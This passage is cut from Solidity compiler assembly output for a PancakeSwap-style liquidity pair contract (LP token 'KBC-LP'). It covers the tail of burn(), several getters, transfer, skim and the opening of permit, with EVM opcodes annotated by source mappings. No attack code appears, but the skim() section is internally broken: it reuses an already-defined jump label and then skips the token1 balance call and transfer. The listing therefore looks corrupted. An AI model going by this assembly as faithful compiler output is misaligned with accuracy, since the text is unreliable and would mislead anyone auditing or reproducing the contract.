IERC20(_token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_239\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_239:\n        /* \"Pair.sol\":8321:8361  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_240\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_240:\n      pop\n        /* \"Pair.sol\":8321:8361  IERC20(_token0).balanceOf(address(this)) */\n      mload\n        /* \"Pair.sol\":8387:8427  IERC20(_token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"Pair.sol\":8421:8425  this */\n      address\n        /* \"Pair.sol\":8387:8427  IERC20(_token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"Pair.sol\":8321:8361  IERC20(_token0).balanceOf(address(this)) */\n      swap2\n      swap3\n      pop\n        /* \"Pair.sol\":8371:8384  uint balance1 */\n      0x00\n      swap2\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":8387:8412  IERC20(_token1).balanceOf */\n      dup6\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"Pair.sol\":8387:8427  IERC20(_token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n        /* \"Pair.sol\":8321:8361  IERC20(_token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"Pair.sol\":8387:8427  IERC20(_token1).balanceOf(address(this)) */\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"Pair.sol\":8387:8412  IERC20(_token1).balanceOf */\n      dup7\n        /* \"Pair.sol\":8387:8427  IERC20(_token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_241\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_241:\n        /* \"Pair.sol\":8387:8427  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_242\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_242:\n        /* \"Pair.sol\":8387:8427  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_243\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_243:\n      pop\n        /* \"Pair.sol\":8387:8427  IERC20(_token1).balanceOf(address(this)) */\n      mload\n        /* \"Pair.sol\":8472:8476  this */\n      address\n        /* \"Pair.sol\":8437:8451  uint liquidity */\n      0x00\n        /* \"Pair.sol\":8454:8478  balanceOf[address(this)] */\n      swap1\n      dup2\n      mstore\n        /* \"Pair.sol\":8454:8463  balanceOf */\n      0x01\n        /* \"Pair.sol\":8387:8427  IERC20(_token1).balanceOf(address(this)) */\n      0x20\n        /* \"Pair.sol\":8454:8478  balanceOf[address(this)] */\n      mstore\n      0x40\n      dup2\n      keccak256\n      sload\n        /* \"Pair.sol\":8387:8427  IERC20(_token1).balanceOf(address(this)) */\n      swap2\n      swap3\n      pop\n        /* \"Pair.sol\":8502:8532  _mintFee(_reserve0, _reserve1) */\n      tag_244\n        /* \"Pair.sol\":8511:8520  _reserve0 */\n      dup9\n        /* \"Pair.sol\":8522:8531  _reserve1 */\n      dup9\n        /* \"Pair.sol\":8502:8510  _mintFee */\n      tag_214\n        /* \"Pair.sol\":8502:8532  _mintFee(_reserve0, _reserve1) */\n      jump\t// in\n    tag_244:\n        /* \"Pair.sol\":8542:8559  uint _totalSupply */\n      0x00\n        /* \"Pair.sol\":8562:8573  totalSupply */\n      sload\n        /* \"Pair.sol\":8489:8532  bool feeOn = _mintFee(_reserve0, _reserve1) */\n      swap1\n      swap2\n      pop\n        /* \"Pair.sol\":8562:8573  totalSupply */\n      dup1\n        /* \"Pair.sol\":8671:8694  liquidity.mul(balance0) */\n      tag_245\n        /* \"Pair.sol\":8671:8680  liquidity */\n      dup5\n        /* \"Pair.sol\":8685:8693  balance0 */\n      dup8\n        /* \"Pair.sol\":8671:8694  liquidity.mul(balance0) */\n      0xffffffff\n        /* \"Pair.sol\":8671:8684  liquidity.mul */\n      tag_175\n        /* \"Pair.sol\":8671:8694  liquidity.mul(balance0) */\n      and\n      jump\t// in\n    tag_245:\n        /* \"Pair.sol\":8671:8709  liquidity.mul(balance0) / _totalSupply */\n      dup2\n      tag_246\n      jumpi\n      invalid\n    tag_246:\n      div\n      swap11\n      pop\n        /* \"Pair.sol\":8803:8815  _totalSupply */\n      dup1\n        /* \"Pair.sol\":8777:8800  liquidity.mul(balance1) */\n      tag_247\n        /* \"Pair.sol\":8777:8786  liquidity */\n      dup5\n        /* \"Pair.sol\":8791:8799  balance1 */\n      dup7\n        /* \"Pair.sol\":8777:8800  liquidity.mul(balance1) */\n      0xffffffff\n        /* \"Pair.sol\":8777:8790  liquidity.mul */\n      tag_175\n        /* \"Pair.sol\":8777:8800  liquidity.mul(balance1) */\n      and\n      jump\t// in\n    tag_247:\n        /* \"Pair.sol\":8777:8815  liquidity.mul(balance1) / _totalSupply */\n      dup2\n      tag_248\n      jumpi\n      invalid\n    tag_248:\n      div\n        /* \"Pair.sol\":8767:8815  amount1 = liquidity.mul(balance1) / _totalSupply */\n      swap10\n      pop\n        /* \"Pair.sol\":8904:8905  0 */\n      0x00\n        /* \"Pair.sol\":8894:8901  amount0 */\n      dup12\n        /* \"Pair.sol\":8894:8905  amount0 > 0 */\n      gt\n        /* \"Pair.sol\":8894:8920  amount0 > 0 && amount1 > 0 */\n      dup1\n      iszero\n      tag_249\n      jumpi\n      pop\n        /* \"Pair.sol\":8919:8920  0 */\n      0x00\n        /* \"Pair.sol\":8909:8916  amount1 */\n      dup11\n        /* \"Pair.sol\":8909:8920  amount1 > 0 */\n      gt\n        /* \"Pair.sol\":8894:8920  amount0 > 0 && amount1 > 0 */\n    tag_249:\n        /* \"Pair.sol\":8873:8984  require(... */\n      tag_250\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x26\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_6c050b0a8d3f2d18d11271ee0a551b7748437b8fa9a6165c561190d34a2947d6\n      0x26\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_250:\n        /* \"Pair.sol\":8994:9025  _burn(address(this), liquidity) */\n      tag_251\n        /* \"Pair.sol\":9008:9012  this */\n      address\n        /* \"Pair.sol\":9015:9024  liquidity */\n      dup5\n        /* \"Pair.sol\":8994:8999  _burn */\n      tag_252\n        /* \"Pair.sol\":8994:9025  _burn(address(this), liquidity) */\n      jump\t// in\n    tag_251:\n        /* \"Pair.sol\":9035:9070  _safeTransfer(_token0, to, amount0) */\n      tag_253\n        /* \"Pair.sol\":9049:9056  _token0 */\n      dup8\n        /* \"Pair.sol\":9058:9060  to */\n      dup14\n        /* \"Pair.sol\":9062:9069  amount0 */\n      dup14\n        /* \"Pair.sol\":9035:9048  _safeTransfer */\n      tag_149\n        /* \"Pair.sol\":9035:9070  _safeTransfer(_token0, to, amount0) */\n      jump\t// in\n    tag_253:\n        /* \"Pair.sol\":9080:9115  _safeTransfer(_token1, to, amount1) */\n      tag_254\n        /* \"Pair.sol\":9094:9101  _token1 */\n      dup7\n        /* \"Pair.sol\":9103:9105  to */\n      dup14\n        /* \"Pair.sol\":9107:9114  amount1 */\n      dup13\n        /* \"Pair.sol\":9080:9093  _safeTransfer */\n      tag_149\n        /* \"Pair.sol\":9080:9115  _safeTransfer(_token1, to, amount1) */\n      jump\t// in\n    tag_254:\n        /* \"Pair.sol\":9136:9176  IERC20(_token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"Pair.sol\":9170:9174  this */\n      address\n        /* \"Pair.sol\":9136:9176  IERC20(_token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":9136:9161  IERC20(_token0).balanceOf */\n      dup10\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"Pair.sol\":9136:9176  IERC20(_token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"Pair.sol\":9136:9161  IERC20(_token0).balanceOf */\n      dup7\n        /* \"Pair.sol\":9136:9176  IERC20(_token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_255\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_255:\n        /* \"Pair.sol\":9136:9176  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_256\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_256:\n        /* \"Pair.sol\":9136:9176  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_257\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_257:\n      pop\n        /* \"Pair.sol\":9136:9176  IERC20(_token0).balanceOf(address(this)) */\n      mload\n        /* \"Pair.sol\":9197:9237  IERC20(_token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"Pair.sol\":9231:9235  this */\n      address\n        /* \"Pair.sol\":9197:9237  IERC20(_token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"Pair.sol\":9136:9176  IERC20(_token0).balanceOf(address(this)) */\n      swap2\n      swap7\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":9197:9222  IERC20(_token1).balanceOf */\n      dup9\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"Pair.sol\":9197:9237  IERC20(_token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n        /* \"Pair.sol\":9136:9176  IERC20(_token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"Pair.sol\":9197:9237  IERC20(_token1).balanceOf(address(this)) */\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"Pair.sol\":9197:9222  IERC20(_token1).balanceOf */\n      dup7\n        /* \"Pair.sol\":9197:9237  IERC20(_token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_258\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_258:\n        /* \"Pair.sol\":9197:9237  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_259\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_259:\n        /* \"Pair.sol\":9197:9237  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_260\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_260:\n      pop\n        /* \"Pair.sol\":9197:9237  IERC20(_token1).balanceOf(address(this)) */\n      mload\n      swap4\n      pop\n        /* \"Pair.sol\":9248:9297  _update(balance0, balance1, _reserve0, _reserve1) */\n      tag_261\n        /* \"Pair.sol\":9256:9264  balance0 */\n      dup6\n        /* \"Pair.sol\":9197:9237  IERC20(_token1).balanceOf(address(this)) */\n      dup6\n        /* \"Pair.sol\":9276:9285  _reserve0 */\n      dup12\n        /* \"Pair.sol\":9287:9296  _reserve1 */\n      dup12\n        /* \"Pair.sol\":9248:9255  _update */\n      tag_186\n        /* \"Pair.sol\":9248:9297  _update(balance0, balance1, _reserve0, _reserve1) */\n      jump\t// in\n    tag_261:\n        /* \"Pair.sol\":9311:9316  feeOn */\n      dup2\n        /* \"Pair.sol\":9307:9354  if (feeOn) kLast = uint(reserve0).mul(reserve1) */\n      iszero\n      tag_262\n      jumpi\n        /* \"Pair.sol\":9345:9353  reserve1 */\n      sload(0x0b)\n        /* \"Pair.sol\":9326:9354  uint(reserve0).mul(reserve1) */\n      tag_263\n      swap1\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":9331:9339  reserve0 */\n      dup1\n      dup3\n      and\n      swap2\n      shl(0x70, 0x01)\n        /* \"Pair.sol\":9345:9353  reserve1 */\n      swap1\n      div\n      and\n        /* \"Pair.sol\":9326:9354  uint(reserve0).mul(reserve1) */\n      0xffffffff\n        /* \"Pair.sol\":9326:9344  uint(reserve0).mul */\n      tag_175\n        /* \"Pair.sol\":9326:9354  uint(reserve0).mul(reserve1) */\n      and\n      jump\t// in\n    tag_263:\n        /* \"Pair.sol\":9318:9323  kLast */\n      0x0e\n        /* \"Pair.sol\":9318:9354  kLast = uint(reserve0).mul(reserve1) */\n      sstore\n        /* \"Pair.sol\":9307:9354  if (feeOn) kLast = uint(reserve0).mul(reserve1) */\n    tag_262:\n        /* \"Pair.sol\":9409:9447  Burn(msg.sender, amount0, amount1, to) */\n      0x40\n      dup1\n      mload\n      dup13\n      dup2\n      mstore\n      0x20\n      dup2\n      add\n      dup13\n      swap1\n      mstore\n      dup2\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n      dup16\n      and\n      swap3\n        /* \"Pair.sol\":9414:9424  msg.sender */\n      caller\n      swap3\n        /* \"Pair.sol\":9409:9447  Burn(msg.sender, amount0, amount1, to) */\n      0xdccd412f0b1252819cb1fd330b93224ca42612892bb3f4f789976e6d81936496\n      swap3\n      swap1\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log3\n        /* \"Pair.sol\":1270:1271  _ */\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"Pair.sol\":1292:1293  1 */\n      0x01\n        /* \"Pair.sol\":1281:1289  unlocked */\n      0x10\n        /* \"Pair.sol\":1281:1293  unlocked = 1 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"Pair.sol\":8025:9454  function burn(... */\n      swap2\n      pop\n      swap2\n      jump\t// out\n        /* \"Pair.sol\":1114:1134  address public owner */\n    tag_101:\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x0f))\n      dup2\n      jump\t// out\n        /* \"Pair.sol\":325:395  address public FeeResiver = 0x9E94Ee69F3CdCd5E74e05563736E4679dA6dB44c */\n    tag_103:\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x06))\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":220:260  string public constant symbol = \"KBC-LP\" */\n    tag_105:\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x06\n      dup2\n      mstore\n      0x20\n      add\n      shl(0xd4, 0x04b42432d4c5)\n      dup2\n      mstore\n      pop\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":2963:3102  function transfer(address to, uint256 value) external returns (bool) {... */\n    tag_112:\n        /* \"ERC20.sol\":3026:3030  bool */\n      0x00\n        /* \"ERC20.sol\":3042:3074  _transfer(msg.sender, to, value) */\n      tag_189\n        /* \"ERC20.sol\":3052:3062  msg.sender */\n      caller\n        /* \"ERC20.sol\":3064:3066  to */\n      dup5\n        /* \"ERC20.sol\":3068:3073  value */\n      dup5\n        /* \"ERC20.sol\":3042:3051  _transfer */\n      tag_197\n        /* \"ERC20.sol\":3042:3074  _transfer(msg.sender, to, value) */\n      jump\t// in\n        /* \"Pair.sol\":402:450  uint public constant MINIMUM_LIQUIDITY = 10 ** 3 */\n    tag_114:\n        /* \"Pair.sol\":443:450  10 ** 3 */\n      0x03e8\n        /* \"Pair.sol\":402:450  uint public constant MINIMUM_LIQUIDITY = 10 ** 3 */\n      dup2\n      jump\t// out\n        /* \"Pair.sol\":18077:18498  function skim(address to) external lock {... */\n    tag_117:\n        /* \"Pair.sol\":1205:1213  unlocked */\n      sload(0x10)\n        /* \"Pair.sol\":1217:1218  1 */\n      0x01\n        /* \"Pair.sol\":1205:1218  unlocked == 1 */\n      eq\n        /* \"Pair.sol\":1197:1238  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_267\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_267:\n        /* \"Pair.sol\":1259:1260  0 */\n      0x00\n        /* \"Pair.sol\":1248:1256  unlocked */\n      0x10\n        /* \"Pair.sol\":1248:1260  unlocked = 0 */\n      sstore\n        /* \"Pair.sol\":18145:18151  token0 */\n      sload(0x08)\n        /* \"Pair.sol\":18194:18200  token1 */\n      sload(0x09)\n        /* \"Pair.sol\":18334:18342  reserve0 */\n      sload(0x0b)\n        /* \"Pair.sol\":18289:18329  IERC20(_token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"Pair.sol\":18323:18327  this */\n      address\n        /* \"Pair.sol\":18289:18329  IERC20(_token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":18145:18151  token0 */\n      swap5\n      dup6\n      and\n      swap5\n        /* \"Pair.sol\":18194:18200  token1 */\n      swap1\n      swap4\n      and\n      swap3\n        /* \"Pair.sol\":18225:18353  _safeTransfer(... */\n      tag_269\n      swap3\n        /* \"Pair.sol\":18145:18151  token0 */\n      dup6\n      swap3\n        /* \"Pair.sol\":18273:18275  to */\n      dup8\n      swap3\n        /* \"Pair.sol\":18289:18343  IERC20(_token0).balanceOf(address(this)).sub(reserve0) */\n      tag_270\n      swap3\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":18334:18342  reserve0 */\n      and\n      swap2\n        /* \"Pair.sol\":18145:18151  token0 */\n      dup6\n      swap2\n        /* \"Pair.sol\":18289:18314  IERC20(_token0).balanceOf */\n      0x70a08231\n      swap2\n        /* \"Pair.sol\":18289:18329  IERC20(_token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n      0x20\n      swap3\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"Pair.sol\":18145:18151  token0 */\n      dup7\n        /* \"Pair.sol\":18289:18329  IERC20(_token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_271\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_271:\n        /* \"Pair.sol\":18289:18329  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_272\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_272:\n        /* \"Pair.sol\":18289:18329  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_273\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_273:\n      pop\n        /* \"Pair.sol\":18289:18329  IERC20(_token0).balanceOf(address(this)) */\n      mload\n      swap1\n        /* \"Pair.sol\":18289:18343  IERC20(_token0).balanceOf(address(this)).sub(reserve0) */\n      0xffffffff\n        /* \"Pair.sol\":18289:18333  IERC20(_token0).balanceOf(address(this)).sub */\n      tag_177\n        /* \"Pair.sol\":18289:18343  IERC20(_token0).balanceOf(address(this)).sub(reserve0) */\n      and\n      jump\t// in\n    tag_270:\n        /* \"Pair.sol\":18225:18238  _safeTransfer */\n      tag_149\n        /* \"Pair.sol\":18225:18353  _safeTransfer(... */\n      jump\t// in\n    tag_269:\n        /* \"Pair.sol\":18472:18480  reserve1 */\n      sload(0x0b)\n        /* \"Pair.sol\":18427:18467  IERC20(_token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"Pair.sol\":18461:18465  this */\n      address\n        /* \"Pair.sol\":18427:18467  IERC20(_token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"Pair.sol\":18363:18491  _safeTransfer(... */\n      tag_274\n      swap3\n        /* \"Pair.sol\":18390:18397  _token1 */\n      dup5\n      swap3\n        /* \"Pair.sol\":18411:18413  to */\n      dup8\n      swap3\n        /* \"Pair.sol\":18427:18481  IERC20(_token1).balanceOf(address(this)).sub(reserve1) */\n      tag_270\n      swap3\n      shl(0x70, 0x01)\n        /* \"Pair.sol\":18472:18480  reserve1 */\n      swap1\n      div\n      sub(shl(0x70, 0x01), 0x01)\n      and\n      swap2\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":18427:18452  IERC20(_token1).balanceOf */\n      dup7\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"Pair.sol\":18427:18467  IERC20(_token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n      0x20\n      swap3\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"Pair.sol\":18427:18452  IERC20(_token1).balanceOf */\n      dup7\n        /* \"Pair.sol\":18427:18467  IERC20(_token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_271\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"Pair.sol\":18363:18491  _safeTransfer(... */\n    tag_274:\n      pop\n      pop\n        /* \"Pair.sol\":1292:1293  1 */\n      0x01\n        /* \"Pair.sol\":1281:1289  unlocked */\n      0x10\n        /* \"Pair.sol\":1281:1293  unlocked = 1 */\n      sstore\n      pop\n        /* \"Pair.sol\":18077:18498  function skim(address to) external lock {... */\n      jump\t// out\n        /* \"Pair.sol\":559:581  address public factory */\n    tag_119:\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x07))\n      dup2\n      jump\t// out\n        /* \"Pair.sol\":614:635  address public token1 */\n    tag_121:\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x09))\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":3475:4439  function permit(... */\n    tag_124:\n        /* \"ERC20.sol\":3688:3703  block.timestamp */\n      timestamp\n        /* \"ERC20.sol\":3676:3684  deadline */\n      dup5\n        /* \"ERC20.sol\":3676:3703  deadline >= block.timestamp */\n      lt\n      iszero\n        /* \"ERC20.sol\":3668:3724  require(deadline >= block.timestamp, \"Pancake: EXPIRED\") */\n      tag_280\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x10\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x82, 0x14185b98d85ad94e8811561412549151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_280:\n        /* \"ERC20.sol\":3836:3852  DOMAIN_SEPARATOR */\n      sload(0x04)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":4073:4086  nonces[owner] */\n      dup1\n      dup10\n      and\n        /* \"ERC20.sol\":3734:3748  bytes32 digest */\n      0x00\n        /* \"ERC20.sol\":4073:4086  nonces[owner] */\n      dup2\n      dup2\n      mstore\n        /* \"ERC20.sol\":4073:4079  nonces */\n      0x05\n        /* \"ERC20.sol\":4073:4086  nonces[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* 